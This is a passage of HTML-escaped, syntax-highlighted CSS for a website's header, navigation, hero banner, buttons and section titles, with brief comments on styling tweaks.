&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            line-height: 1.7&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* Slightly increased line height &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; readability */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            font-size: 16px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        header &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            background: rgba&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;46, 125, 50, 0.95&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* Slightly transparent primary color */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--white&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            padding: 1rem 0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            position: sticky&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            top: 0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            z-index: 100&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            box-shadow: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 4px 12px rgba&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0, 0, 0, 0.15&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* Enhanced shadow */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .container &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            width: 90%&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            max-width: 1200px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            margin: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; auto&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .nav-container &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            display: flex&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            justify-content: space-between&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            align-items: center&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .logo &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            display: flex&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            align-items: center&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            gap: 10px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            font-size: 1.8rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            font-weight: 700&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .logo i &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            font-size: 2rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        nav ul &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            display: flex&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            list-style: none&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        nav ul li &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            margin-left: 2rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        nav ul li a &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--white&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            text-decoration: none&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            font-weight: 500&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            transition: all 0.3s ease&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            padding: 0.5rem 0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            position: relative&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        nav ul li a:hover &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--accent&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        nav ul li a::after &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            content: &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            position: absolute&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            bottom: 0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            left: 0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            width: 0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            height: 2px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            background-color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--accent&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            transition: width 0.3s ease&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        nav ul li a:hover::after &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            width: 100%&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .hero &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            background: linear-gradient&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;rgba&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0, 0, 0, 0.6&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, rgba&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0, 0, 0, 0.4&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;, url&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;https://images.unsplash.com/photo-1542601906990-b4d3fb778b09?ixlib=rb-4.0.3&amp;amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&amp;amp;auto=format&amp;amp;fit=crop&amp;amp;w=2073&amp;amp;q=80&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            background-size: cover&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            background-position: center&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            height: 80vh&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            display: flex&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            align-items: center&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            text-align: center&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--white&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .hero-content &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            max-width: 800px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            margin: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; auto&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .hero h1 &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            font-size: 3.5rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            margin-bottom: 1rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            text-shadow: 2px 2px 4px rgba&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0, 0, 0, 0.5&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .hero p &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            font-size: 1.3rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            margin-bottom: 2rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .btn &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            display: inline-block&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            background-color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--accent&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--white&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            padding: 0.9rem 2.2rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* Slightly larger padding */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            border-radius: 8px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* More modern rounded corners */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            text-decoration: none&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            font-weight: 600&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            transition: all 0.3s ease&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            border: none&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            cursor: pointer&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            box-shadow: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 6px 10px rgba&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0, 0, 0, 0.1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* Slightly enhanced shadow */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .btn:hover &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            background-color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--primary&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            transform: translateY&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;-5px&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* More pronounced lift effect */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            box-shadow: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 8px 15px rgba&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0, 0, 0, 0.2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /* Stronger hover shadow */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        section &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            padding: 5rem 0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .section-title &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            text-align: center&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            margin-bottom: 3rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .section-title h2 &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            font-size: 2.5rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--primary&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            margin-bottom: 1rem&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            position: relative&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            display: inline-block&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .section-title h2::after &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
